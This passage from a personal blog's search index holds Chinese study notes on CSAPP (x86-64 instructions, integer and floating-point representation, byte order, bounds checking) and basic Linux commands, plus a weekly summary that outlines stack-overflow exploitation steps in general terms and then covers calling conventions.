系统的限制：传输指令的两个操作数不能都指向内存位置</p><p>在将较小的源值复制到较大的目的时：</p><p>movz类</p><blockquote><p>把传输到目的的中剩余的字节填充为0</p><p>movzbw 后两个字符分别代表第一个字符指定的源大小，和目的位置的源大小</p></blockquote><p>movs类</p><blockquote><p>就是进行符号填充，把源操作的最高位进行复制</p></blockquote><p>movl </p><blockquote><p>把4字节的源值拓展到8字节</p></blockquote><blockquote><p>%rax(64)&#x3D;%eax(32)+%ax(16)+%ah(8)+%al(8)</p></blockquote><h4 id="压入和弹出数据"><a href="#压入和弹出数据" class="headerlink" title="压入和弹出数据"></a>压入和弹出数据</h4><p><strong>栈向下增长</strong>，栈顶的地址是栈中元素地址中最低的。栈指针 rsp 保存栈顶元素的地址</p><p>栈指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pushq s //R[%rsp]=R[%rsp]-8</span><br><span class="line">        //M[R[%rsp]]=s</span><br><span class="line">popq D  //D=M[R[%rsp]]</span><br><span class="line">        //R[%rsp]=R[%rsp]+8</span><br></pre></td></tr></table></figure><p>使用 mov 指令和标准的内存寻址方法可以访问<strong>栈内的任意位置</strong>，而非仅限于栈顶</p><h3 id="算数和逻辑操作"><a href="#算数和逻辑操作" class="headerlink" title="算数和逻辑操作"></a>算数和逻辑操作</h3><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111952588.png" alt="整数算数操作"></p><h4 id="加载有效地址"><a href="#加载有效地址" class="headerlink" title="加载有效地址"></a>加载有效地址</h4><p>指令leaq:加载有效地址，就是mov指令的变形</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">scale</span><span class="params">(<span class="type">long</span> x,<span class="type">long</span> y,<span class="type">long</span> z)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> t=x+<span class="number">4</span>*y+<span class="number">12</span>*z;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">scale:</span><br><span class="line">  leaq (%rdi,%rsi,4),%rax x+4*y</span><br><span class="line">  leaq (%rdx,%rdx,2),%rdx z=z+2*z</span><br><span class="line">  leaq (%rax,%rdx,4),%rax x+4*y+4*(3*z)</span><br></pre></td></tr></table></figure><h4 id="其他的指令如上图"><a href="#其他的指令如上图" class="headerlink" title="其他的指令如上图"></a>其他的指令如上图</h4><h4 id="特殊的算数运算"><a href="#特殊的算数运算" class="headerlink" title="特殊的算数运算"></a>特殊的算数运算</h4><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111952590.png" alt="特殊的算数运算"></p><blockquote><p>要求被乘数放在了%rax中</p><p>imulp:计算结果存放（%rdx高位 %rax低位）<em>用于有符号数</em></p><p>mulp:用于无符号数</p></blockquote><h2 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h2><h3 id="条件码"><a href="#条件码" class="headerlink" title="条件码"></a>条件码</h3><p>单个位的条件码寄存器：（判断状态）</p><blockquote><p>CF :进位标志（检测无符号溢出）</p><p>ZF :零标志</p><p>SF:符号标志</p><p>OF:溢出标志（正溢出，负溢出）</p></blockquote><h3 id="访问条件码"><a href="#访问条件码" class="headerlink" title="访问条件码"></a>访问条件码</h3><p>三种使用方法</p><blockquote><p>1.根据条件码的某种组合，将第一个字节设置为0或者1</p><p>2.条件跳转到其他的程序部分</p><p>3.有条件的传送数据</p></blockquote><p><strong>SET</strong>指令</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111952591.png" alt="SET指令"></p><h3 id="跳跃指令"><a href="#跳跃指令" class="headerlink" title="跳跃指令"></a>跳跃指令</h3><p>无条件跳转：jump</p><p>其他跳转指令</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111952592.png" alt="其他跳转指令"></p><blockquote><p>跳转指令在反汇编中的值为跳转到的那个指令的地址，也就是跳转指令后面的那个地址</p></blockquote><p>C语言的if-else通用式转化在汇编中实现模板</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(test-expr)</span><br><span class="line">    then-statement</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    <span class="keyword">else</span>-statement</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">t=test-expr;</span><br><span class="line"><span class="keyword">if</span>(!t)</span><br><span class="line">    <span class="keyword">goto</span> <span class="literal">false</span>;</span><br><span class="line">then-statement</span><br><span class="line">    <span class="keyword">goto</span> done;</span><br><span class="line"><span class="literal">false</span>:</span><br><span class="line">    <span class="keyword">else</span>-statement;</span><br><span class="line">done;</span><br></pre></td></tr></table></figure><p>条件传送：</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111952593.png" alt="条件传送"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      
        <tags>
            
            <tag> 123 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>csapp5(网络编程)</title>
      <link href="/posts/5197.html"/>
      <url>/posts/5197.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 深入理解计算机系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 书 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>csapp4</title>
      <link href="/posts/26678.html"/>
      <url>/posts/26678.html</url>
      
        <content type="html"><![CDATA[<h2 id="整数运算"><a href="#整数运算" class="headerlink" title="整数运算"></a>整数运算</h2><h3 id="无符号加法"><a href="#无符号加法" class="headerlink" title="无符号加法"></a>无符号加法</h3><blockquote><p>当 x+y &gt;&#x3D; 2^w，实际结果为 s &#x3D; x+y-2^w</p><p> x+y，<strong>s &#x3D; (x+y) % 2^w</strong></p><p><strong>检验溢出的方式：</strong>如果 <strong>s&lt;x，说明溢出</strong></p><p><strong>无符号数的非</strong>~x &#x3D; 2^w - x (x&gt;0)</p><blockquote><p>~x&#x3D;x(x&#x3D;0)</p></blockquote></blockquote><h3 id="补码加法"><a href="#补码加法" class="headerlink" title="补码加法"></a>补码加法</h3><p>当 x+y &gt;&#x3D; 2^(w-1)， s &#x3D; x+y-2^w</p><p>当 x+y &lt; -2^(w-1)，s &#x3D; x+y+2^w</p><p><strong>正溢出的结果是负数，负溢出的结果是正数。</strong></p><p><strong>检验溢出的方式：</strong>当 x,y&gt;0 而 s&lt;&#x3D;0 是正溢出；当 x,y&lt;0 而 s&gt;&#x3D;0 是负溢出</p><h3 id="补码的非"><a href="#补码的非" class="headerlink" title="补码的非"></a>补码的非</h3><p>当 x &#x3D; TMin，-x &#x3D; TMin</p><p>当 x ≠ TMin，-x &#x3D; -x</p><blockquote><p>补码（Two’s Complement）是一种在计算机系统中表示有符号整数的方法。对于一个给定的二进制数，补码是通过以下步骤得到的：</p><ol><li>取反：将所有的1变为0，所有的0变为1（除了最高位符号位）。</li><li>加一：将取反后的结果加1。</li></ol><p>补码的非（Negative of a Complement）是指对一个数的补码再取补码。具体来说，一个数A的补码的非可以这样得到：</p><ol><li>取反：将A的补码按位取反（包括符号位）。</li><li>加一：将取反后的结果加1。</li></ol></blockquote><p><strong>补码非的位级表示：****对每一位求补，结果再加 1</strong></p><p><strong>计算补码非的第二种方法：</strong>假设 k 是最右边的 1 的位置，对 k 左边的所有位取反</p><h3 id="无符号乘法"><a href="#无符号乘法" class="headerlink" title="无符号乘法"></a>无符号乘法</h3><p><strong>无符号乘法的积</strong> <strong>m &#x3D; (x*y) % 2^w</strong></p><h3 id="补码乘法"><a href="#补码乘法" class="headerlink" title="补码乘法"></a>补码乘法</h3><p><strong>补码乘法的积</strong> <strong>m &#x3D; (x*y) % 2^w</strong></p><h3 id="乘以常数"><a href="#乘以常数" class="headerlink" title="乘以常数"></a>乘以常数</h3><blockquote><p>大多数机器上，整数乘法需要 <strong>10 个或更多</strong>的时钟周期，而加法、减法、位级运算和移位只需要 1 个时钟周期</p></blockquote><p><strong>编译器对整数乘法进行优化的方式</strong>：用<strong>移位和加法或减法</strong>运算的组合来代替常数因子的乘法。</p><p>左移 k 位等于乘以 2^k</p><blockquote><p>例: x*3&#x3D; x&lt;&lt;2+x</p></blockquote><h3 id="除以2的幂"><a href="#除以2的幂" class="headerlink" title="除以2的幂"></a>除以2的幂</h3><blockquote><p> 除以 2 的幂可以用移位运算来代替，无符号采用逻辑右移，补码采用算术右移</p><p>对于有符号数而言，算术右移的结果相当于进行除法运算后<strong>向下舍入</strong></p></blockquote><h2 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h2><p>非常大，非常接近零，近似值计算</p><h3 id="二进制小数"><a href="#二进制小数" class="headerlink" title="二进制小数"></a>二进制小数</h3><blockquote><p>小数的二进制表示法都是近似表示,x 可以由形如 2^i + 2^j + … + 2^n 的多项式表示</p></blockquote><h3 id="IEEE-浮点表示"><a href="#IEEE-浮点表示" class="headerlink" title="IEEE 浮点表示"></a>IEEE 浮点表示</h3><blockquote><p><strong>IEEE 浮点标准</strong>的表示形式为：V &#x3D; (-1)^S * M * 2^E</p></blockquote><blockquote><ol><li><strong>符号</strong>：<strong>S</strong> 决定是负数还是正数</li><li><strong>尾数</strong>：<strong>M</strong> 是一个二进制小数，范围是 1<del>2-ε 或 0</del>1-ε</li><li><strong>阶码</strong>：<strong>E</strong> 的作用是对浮点数加权</li></ol></blockquote><p>不同精度的浮点的尾数和阶码也有所不同</p><blockquote><ol><li>k 位的阶码字段 e编码 E；float 中 k&#x3D;8，double 中 k&#x3D;11</li><li>n 位的小数字段 f 编码 M；float 中 n&#x3D;23，double 中 n&#x3D;52</li></ol></blockquote><p>被编码的值可以分成三种情况：</p><blockquote><p>规格化的值：阶码字段即不全为 0 也不全为 1 时属于规格化值</p><ul><li><blockquote><p> 阶码字段解释方式：<strong>E &#x3D; e - (2^(k-1)-1)</strong></p><p>小数字段解释方式：<strong>M &#x3D; 1 + f</strong></p></blockquote></li></ul></blockquote><blockquote><p>非规格化的值: 阶码字段全为 0 时属于非规格化形式</p></blockquote><blockquote><p>特殊值: 阶码字段全为 1 </p><blockquote><ul><li><ol><li><strong>小数字段全为 0：表示无穷</strong></li><li><strong>小数字段非零：表示 NaN</strong>(not a number)</li></ol></li></ul></blockquote></blockquote><h3 id="舍入"><a href="#舍入" class="headerlink" title="舍入"></a>舍入</h3><blockquote><p><strong>向偶数舍入（向最接近的值舍入）</strong>：非中间值 (0.5) 四舍五入，中间值向偶数舍入。</p><p>向零舍入</p><p>向下舍入</p><p>向上舍入</p></blockquote><h3 id="浮点运算"><a href="#浮点运算" class="headerlink" title="浮点运算"></a>浮点运算</h3><blockquote><p>IEEE 标准定义 1&#x2F;-0 &#x3D; -∞，1&#x2F;+0 &#x3D; +∞</p></blockquote><p>浮点运算是<strong>可交换不可结合也不可分配</strong>的</p><p>浮点加法满足<strong>加法和乘法上的单调性</strong>。如果 a&gt;&#x3D;b，则 x+a &gt;&#x3D; x+b</p><h3 id="c语言中"><a href="#c语言中" class="headerlink" title="c语言中"></a>c语言中</h3><blockquote><p>int 到 float：不会溢出，可能舍入</p><p>int 或 float 到 double：不会溢出也不会舍入</p><p>double 到 float：可能溢出和舍入</p><p><strong>float 或 double 到 int：</strong>向零舍入，很大时可能溢出，很接近零时也可能溢出。当从浮点转换到整数时如果溢出，转变结果都为 [1000]，因此一个正浮点可能得到一个负整数</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 深入理解计算机系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 书 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>csapp3</title>
      <link href="/posts/43639.html"/>
      <url>/posts/43639.html</url>
      
        <content type="html"><![CDATA[<h2 id="运算"><a href="#运算" class="headerlink" title="运算"></a>运算</h2><h3 id="布尔代数中的基本运算"><a href="#布尔代数中的基本运算" class="headerlink" title="布尔代数中的基本运算"></a>布尔代数中的基本运算</h3><blockquote><p>或 | </p><p>与 &amp;</p><p>取反 ~</p><p>异或 ^ (相同为零，不同为一)</p></blockquote><p>计算时&amp;和|的分配律存在</p><blockquote><p>例：(a&amp;b)|c 等同于 (a|c)&amp;(b|c)</p></blockquote><h3 id="位级运算"><a href="#位级运算" class="headerlink" title="位级运算"></a>位级运算</h3><p>将其他进制转换成2进制在进行运算</p><h4 id="掩码"><a href="#掩码" class="headerlink" title="掩码"></a>掩码</h4><blockquote><p>表达式 <strong>~0</strong> 可以生成一个全 1 的掩码，不管机器的字大小是多少。</p></blockquote><h3 id="移位运算"><a href="#移位运算" class="headerlink" title="移位运算"></a>移位运算</h3><blockquote><p>左移 k 位丢掉最高的 k 位，并在右端补 k 个 0。</p><p>右移分为<strong>逻辑右移</strong>和<strong>算术右移</strong>。</p><blockquote><p><strong>逻辑右移左端补 0，算术右移左端补最高有效位的值。</strong></p></blockquote><blockquote><p>一般都对有符号数使用算术右移，即补符号位的值。无符号数，<strong>只能是逻辑右移</strong>，即补 0</p></blockquote></blockquote><h2 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h2><p>表示:无符号表示与补码表示</p><p>(java 只支持有符号数)</p><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><p>复数绝对值范围比正数大一(大于等于32位机器在有符号数上)</p><h4 id="补码编码"><a href="#补码编码" class="headerlink" title="补码编码"></a>补码编码</h4><p>定义:最高位为符号位</p><blockquote><p>[0001]&#x3D;-0(x)2^3 + 0(x)2^2+ 0(x)2^1+1(x)1</p></blockquote><blockquote><p>C 库头文件  定义了一组常量来限定不同整数数据类型的取值范围。INT_MAX、INT_MIN、UINT_MAX</p><p>C 库头文件 中定义了 uint16_t, int32_t 等类型，用于声明确定宽度类型的整数。</p></blockquote><h4 id="有符号数和无符号数之间的转换"><a href="#有符号数和无符号数之间的转换" class="headerlink" title="有符号数和无符号数之间的转换"></a>有符号数和无符号数之间的转换</h4><p>保持位值不变，只改变解释位的方式</p><blockquote><p><strong>补码 x 转无符号数</strong></p><ul><li>x &gt;&#x3D; 0，值不变</li><li>x &lt; 0，转换后的值为 2^w + x</li></ul><p><strong>无符号数 x 转补码</strong></p><ul><li>x &lt; 2^(w-1)，值不变</li><li>x &gt;&#x3D; 2^(w-1)，转换后的值为 x - 2^w</li></ul></blockquote><p>c语言中</p><blockquote><p>C 语言中有符号数和无符号数相加减，有符号被转换成无符号</p></blockquote><h4 id="拓展数字的位表示"><a href="#拓展数字的位表示" class="headerlink" title="拓展数字的位表示"></a>拓展数字的位表示</h4><p>扩展无符号数使用零扩展，即在最高位前加 0</p><p>扩展有符号数使用符号扩展，即在最高位前加最高有效位的值</p><h4 id="截断数字"><a href="#截断数字" class="headerlink" title="截断数字"></a>截断数字</h4><p>对一个 w 位的数字截断为一个 k 位数字，将丢弃高 w-k 位。</p><p>对于无符号数而言，截断后的数字实际上等于 w mod 2^k，即取余</p>]]></content>
      
      
      <categories>
          
          <category> 深入理解计算机系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 书 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>csapp2</title>
      <link href="/posts/27318.html"/>
      <url>/posts/27318.html</url>
      
        <content type="html"><![CDATA[<h1 id="信息的表示与处理"><a href="#信息的表示与处理" class="headerlink" title="信息的表示与处理"></a>信息的表示与处理</h1><h2 id="1-字长"><a href="#1-字长" class="headerlink" title="1.字长"></a>1.字长</h2><blockquote><p>对于一个字长为 a 位的机器，虚拟地址的范围是2的 a 次方~0 </p><blockquote><p>32位最大的虚拟内存大于是4GB 64 位可达到16EB</p></blockquote></blockquote><blockquote><p>数据大小</p><blockquote><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111953367.png" style="zoom:50%;" /><p>为确定固定大小 int 32_t 为4字节 int 64_t 为8八字节  </p></blockquote></blockquote><h2 id="2-寻址与字节顺序"><a href="#2-寻址与字节顺序" class="headerlink" title="2.寻址与字节顺序"></a>2.寻址与字节顺序</h2><blockquote><p>大端法：最高有效字节在最前面的部分</p><p>小端法：最低有效字节在最前面的部分</p><blockquote><p>例：小端法表示 ox01234567</p><p>机器里面的存储为 67 45 23 01</p></blockquote><p>大部分Intel 兼容机为小端模式，IBM和Oracle 的机器为大端模式</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span>* byte_pointer;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_bytes</span><span class="params">(byte_pointer start, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line"><span class="type">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; %.2x&quot;</span>, start[i]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">show_int</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">show_bytes((byte_pointer)&amp;x, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_float</span><span class="params">(<span class="type">float</span> x)</span> &#123;</span><br><span class="line">show_bytes((byte_pointer)&amp;x, <span class="keyword">sizeof</span>(<span class="type">float</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">show_pointer</span><span class="params">(<span class="type">void</span> *x)</span> &#123;</span><br><span class="line">show_bytes((byte_pointer)&amp;x, <span class="keyword">sizeof</span>(<span class="type">void</span> *));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ival = <span class="number">12345</span>;</span><br><span class="line"><span class="type">float</span> fval = (<span class="type">float</span>)ival;</span><br><span class="line"><span class="type">int</span>* pval = &amp;ival;</span><br><span class="line">show_int(ival);</span><br><span class="line">show_float(fval);</span><br><span class="line">show_pointer(pval);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这段代码在不同的大小端读取的机器中打印出来的值不一样</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 深入理解计算机系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 书 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>csapp（序）</title>
      <link href="/posts/36322.html"/>
      <url>/posts/36322.html</url>
      
        <content type="html"><![CDATA[<h1 id="计算机系统漫游"><a href="#计算机系统漫游" class="headerlink" title="计算机系统漫游"></a>计算机系统漫游</h1><h2 id="c或者c-几乎没有边界检查"><a href="#c或者c-几乎没有边界检查" class="headerlink" title="c或者c++几乎没有边界检查"></a>c或者c++几乎没有边界检查</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">2</span>];</span><br><span class="line">    <span class="type">double</span> d;</span><br><span class="line">&#125;<span class="type">struct_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">fun</span><span class="params">(<span class="type">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">struct_t</span> s;</span><br><span class="line">    s.d=<span class="number">3.14</span>;</span><br><span class="line">    s.a[i]=<span class="number">1073741824</span>;</span><br><span class="line">    <span class="keyword">return</span> s.d;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>fun(0)—– 3.14</p><p>fun(1)—– 3.14</p><p>fun(2)—– 3.1399998664856</p><p>fun(3)—– 2.00000061035156</p><p>……</p><p>运行到fun(6)程序崩溃</p><blockquote><p>由于内存中数组越界相应的d内存的位置的值被数组的赋值给取代了</p></blockquote></blockquote><h2 id="连续访问内存的读取速度远大于随机读取"><a href="#连续访问内存的读取速度远大于随机读取" class="headerlink" title="连续访问内存的读取速度远大于随机读取"></a>连续访问内存的读取速度远大于随机读取</h2><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><h3 id="1-进程"><a href="#1-进程" class="headerlink" title="1.进程"></a>1.进程</h3><blockquote><p>进行一个程序的一种抽象</p><h4 id="1）上下文"><a href="#1）上下文" class="headerlink" title="1）上下文"></a>1）上下文</h4><blockquote><p>相当于计算机读取某一步骤的进行状态</p></blockquote></blockquote><h3 id="2-线程"><a href="#2-线程" class="headerlink" title="2.线程"></a>2.线程</h3><blockquote><p>一个进程可以由多个线程组成</p><p>多线程的速率高于多进程</p></blockquote><h3 id="3-虚拟内存"><a href="#3-虚拟内存" class="headerlink" title="3.虚拟内存"></a>3.虚拟内存</h3><blockquote><p>进程的虚拟地址</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 深入理解计算机系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 书 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux操作</title>
      <link href="/posts/51009.html"/>
      <url>/posts/51009.html</url>
      
        <content type="html"><![CDATA[<h3 id="ls-列出"><a href="#ls-列出" class="headerlink" title="ls 列出"></a>ls 列出</h3><blockquote><p>ls  可选：-a(显示所有文件) -l(详细信息显示) -d(查看目录属性)</p></blockquote><h3 id="cd-打开"><a href="#cd-打开" class="headerlink" title="cd 打开"></a>cd 打开</h3><blockquote><p>cd [路径] </p><p>cd .. 上一级 cd ~ 返回home目录</p></blockquote><h3 id="mkdir-创建目录"><a href="#mkdir-创建目录" class="headerlink" title="mkdir 创建目录"></a>mkdir 创建目录</h3><blockquote><p>makir [-p] (可选) [路径]</p><p>-p 自动创建不存在的父目录，用于一次性创建多层级目标</p></blockquote><h3 id="touch-创建文档"><a href="#touch-创建文档" class="headerlink" title="touch 创建文档"></a>touch 创建文档</h3><blockquote><p>touch [路径]</p><p>touch text.txt</p></blockquote><h3 id="cat-more-打开文本"><a href="#cat-more-打开文本" class="headerlink" title="cat&#x2F;more 打开文本"></a>cat&#x2F;more 打开文本</h3><blockquote><p>cat&#x2F;more [路径]</p><p>cat 一次性打开全部，more 打开部分，可翻页依次查看全部</p></blockquote><h3 id="cp-复制"><a href="#cp-复制" class="headerlink" title="cp 复制"></a>cp 复制</h3><blockquote><p>cp [-r] (可选)  类型1 类型2</p><p>-r 在复制文件夹时使用</p><p>类型1 是被复制的 类型2是要复制去的</p></blockquote><h3 id="pwd-显示当前路径"><a href="#pwd-显示当前路径" class="headerlink" title="pwd 显示当前路径"></a>pwd 显示当前路径</h3><h3 id="mv-移动"><a href="#mv-移动" class="headerlink" title="mv 移动"></a>mv 移动</h3><blockquote><p>mv 1 2</p><p>1 被移动的文件或目录 2 要移动到的文件或目录</p></blockquote><h3 id="rm-删除"><a href="#rm-删除" class="headerlink" title="rm 删除"></a>rm 删除</h3><blockquote><p>rm [-r -f] (可选) [1 2 3 4 …]</p><p>-r 删除文件夹</p><p>-f 强制删除 在root权限时不提醒</p></blockquote><h3 id="通配符-‘-’"><a href="#通配符-‘-’" class="headerlink" title="通配符 ‘*’"></a>通配符 ‘*’</h3><blockquote><p>test* 表示以test开头</p><p>‘*’test 表示以test结尾</p><p>‘*’test(t后面也有星) 表示包test的</p></blockquote><h3 id="which-查找命令的程序文件位置"><a href="#which-查找命令的程序文件位置" class="headerlink" title="which 查找命令的程序文件位置"></a>which 查找命令的程序文件位置</h3><blockquote><p>which [要查找的命令]</p></blockquote><h3 id="find-查找指定文件"><a href="#find-查找指定文件" class="headerlink" title="find 查找指定文件"></a>find 查找指定文件</h3><blockquote><p>1.find [起始路径] -name “要找的文件名”</p><blockquote><p>通过名字查找</p></blockquote><p>2.find [起始路径] -size +|-n[kmg]</p><blockquote><p>通过大小查找</p><p>+-表示大于小于</p><p>n 表示大小数字</p><p>kmg即单位 kb mb gb</p></blockquote></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一周(栈溢出)</title>
      <link href="/posts/2058.html"/>
      <url>/posts/2058.html</url>
      
        <content type="html"><![CDATA[<p>基本原理：</p><blockquote><p>输入数值过长造成的覆盖。  </p></blockquote><p>基本流程：</p><blockquote><p>  1.在ida中打开</p><ol start="2"><li>找到问题（在哪个函数中会发生栈溢出）</li><li>python</li><li>用gdp调试（pause）</li><li>找断点</li><li>将返回地址返回目的地址（backdoor）</li><li>拿到权限</li></ol></blockquote><p>解决：修改长度：</p><blockquote><ol><li><p>右键打开assembly</p></li><li><p>直接修改不能覆盖后面的代码，用mov移动</p></li><li><p>导出</p></li></ol></blockquote><h2 id="不同的调用约定"><a href="#不同的调用约定" class="headerlink" title="不同的调用约定"></a>不同的调用约定</h2><h3 id="cdecl调用规定"><a href="#cdecl调用规定" class="headerlink" title="cdecl调用规定"></a>cdecl调用规定</h3><blockquote><p>函数参数按照从右到左的顺序入栈</p><p>支持调用可变参数函数</p></blockquote><p>对C函数的名字修饰约定特点：函数名前加上下划线</p><h3 id="stdcall调用约定"><a href="#stdcall调用约定" class="headerlink" title="stdcall调用约定"></a>stdcall调用约定</h3><blockquote><p>主调函数参数从右向左入栈</p><p>除指针或者引用类型外用数值传递的方式</p></blockquote><p>C函数，stdcall名称修饰方式是在函数名字前添加下划线，在函数名字后添加@和函数参数的大小</p><h3 id="fastcall调用约定"><a href="#fastcall调用约定" class="headerlink" title="fastcall调用约定"></a>fastcall调用约定</h3><blockquote><p>常使用ECX和EDX寄存器传递前两个DWORD(四字节双字)类型或更少字节的函数参数，其余参数按照从右向左的顺序入栈</p><p>返回值在EAX中</p></blockquote><p>编译器使用两个@修饰函数名字，后跟十进制数表示的函数参数列表大小(字节数)，如@function_name@number</p><h3 id="thiscall调用约定"><a href="#thiscall调用约定" class="headerlink" title="thiscall调用约定"></a>thiscall调用约定</h3><h3 id="naked-call-调用约定"><a href="#naked-call-调用约定" class="headerlink" title="naked call 调用约定"></a>naked call 调用约定</h3><h3 id="pascal-调用约定"><a href="#pascal-调用约定" class="headerlink" title="pascal 调用约定"></a>pascal 调用约定</h3><h2 id="调用约定的影响"><a href="#调用约定的影响" class="headerlink" title="调用约定的影响"></a>调用约定的影响</h2><blockquote><p>在不同编译器产生的栈帧得到方式也不太相同，跨平台的开发中调用中，通常选择stdcall约定</p></blockquote><h2 id="X86函数返回值的传递方法"><a href="#X86函数返回值的传递方法" class="headerlink" title="X86函数返回值的传递方法"></a>X86函数返回值的传递方法</h2><blockquote><p>若返回值不超过4字节(如int、short、char、指针等类型)，通常将其保存在EAX寄存器中，调用方通过读取EAX获取返回值</p><p> 若返回值大于4字节而小于8字节(如long long或_int64类型)，则通过EAX+EDX寄存器联合返回，其中EDX保存返回值高4字节，EAX保存返回值低4字节</p><p> 若返回值为浮点类型(如float和double)，则通过专用的协处理器浮点数寄存器栈的栈顶返回</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 每周总结 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
